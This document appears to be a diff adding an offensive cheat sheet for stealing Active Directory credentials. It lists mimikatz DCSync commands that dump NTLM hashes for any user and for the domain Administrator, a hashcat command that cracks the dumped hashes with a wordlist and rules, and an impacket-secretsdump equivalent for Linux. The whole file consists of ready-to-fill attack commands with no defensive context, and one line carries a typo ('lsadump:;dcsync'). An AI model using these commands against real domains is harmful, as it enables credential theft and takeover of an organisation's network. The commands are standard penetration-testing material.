@@ -1,0 +1,11 @@
+#get NTLM with dcsync
+mimikatz # lsadump::dcsync /user:<domain>\<user>
+##dcsync on Administrator
+mimikatz # lsadump:;dcsync /user:<domain>\Administrator
+#crack NTLM with hashcat
+hashcat -m 1000 <hashes.dcsync> <rockyou> -r /usr/share/hashcat/rules/best64.rule --force
+
+#Linux
+#dcsync with impacket
+impacket-secretsdump -just-dc-user <target_user> <domain>/<myusername>:<password>@<DC_IP>
+
